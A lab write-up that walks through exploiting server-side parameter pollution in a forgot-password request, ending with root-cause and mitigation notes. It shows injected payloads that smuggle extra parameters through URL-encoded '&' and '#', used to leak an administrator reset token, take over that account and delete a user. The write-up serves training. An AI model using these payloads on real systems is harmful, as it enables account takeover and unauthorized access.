Server-Side Parameter Pollution in Query String (SSPP)
Lab Difficulty: Practitioner
Vulnerability Type: Server-Side Parameter Pollution / Query String Injection / Authentication Bypass

Summary
This lab demonstrates a server-side parameter pollution (SSPP) vulnerability. By abusing how query strings are parsed on the server, it’s possible to manipulate internal API requests. In this case, 
attackers can inject additional parameters into the backend request by URL-encoding special characters, eventually obtaining a password reset token for the administrator account,
allowing unauthorized access.

Objective
Exploit the server’s query string handling by injecting additional parameters, retrieve the administrator's password reset token, reset the password,
log in as the administrator, and delete the user carlos.

Technical Walkthrough
1. Discover the Forgot Password Functionality
Logged in with Burp’s browser and triggered a forgot password request for administrator.

In Proxy > HTTP History, located the POST /forgot-password request and the related JavaScript file:

/static/js/forgotPassword.js
Right-clicked the POST /forgot-password request and selected Send to Repeater.

2. Probe Input Behavior
Sent the request with a valid username:

username=administrator
Got a consistent response.

Changed the username to an invalid one:

username=administratorx
Response:

Invalid username
3. Inject URL-Encoded Characters
Injected a URL-encoded & to attempt a second parameter:

username=administrator%26x=y
Response:

Parameter is not supported
Suggests that the backend parsed x=y as a separate parameter.

Injected a URL-encoded # to attempt query string truncation:

username=administrator%23
Response:

Field not specified
4. Inject a New Parameter with Truncation
Attempted injecting a new parameter (field) and truncating:

username=administrator%26field=x%23
Response:

Invalid field
Indicates field is a valid server-side parameter being processed.

5. Brute Force the Field Parameter
Right-clicked the request > Send to Intruder.

Modified parameter:

username=administrator%26field=§x§%23
Selected Payload list > Server-side variable names and started the attack.

Observed that payloads username and email returned HTTP 200.

Confirmed working payload:

username=administrator%26field=email%23
6. Extract the Password Reset Token
Reviewed /static/js/forgotPassword.js in HTTP History.

Found this line in the JavaScript:

/forgot-password?reset_token=${resetToken}
Guessed a valid field:

username=administrator%26field=reset_token%23
Response returned a valid password reset token.

7. Reset the Administrator Password
In the browser, accessed:


/forgot-password?reset_token=<extracted_token>
Set a new password (e.g., adm1nPass!).

8. Log In as Administrator and Delete Carlos
Logged in using:


Username: administrator
Password: adm1nPass!
Navigated to the admin panel: /admin.

Deleted user carlos via:

GET /admin/delete?username=carlos
Result
Successfully solved the lab by exploiting server-side parameter pollution through query string manipulation, retrieved the administrator’s reset token, reset the password, and deleted carlos.

Root Cause
The backend logic trusted and re-parsed query string input, allowing attackers to:

Inject additional parameters using URL-encoded characters (&, #).

Override internal API parameters not exposed to the frontend.

Manipulate server-side behavior via ambiguous parameter parsing.

Mitigation
To prevent such vulnerabilities:

Strictly validate all incoming parameters on the backend.

Use whitelisting to allow only expected query parameters.

Sanitize and reject any ambiguous or duplicate parameter injections.

Avoid re-parsing user-supplied values that can alter server logic.

Use well-maintained frameworks that handle input parsing securely.

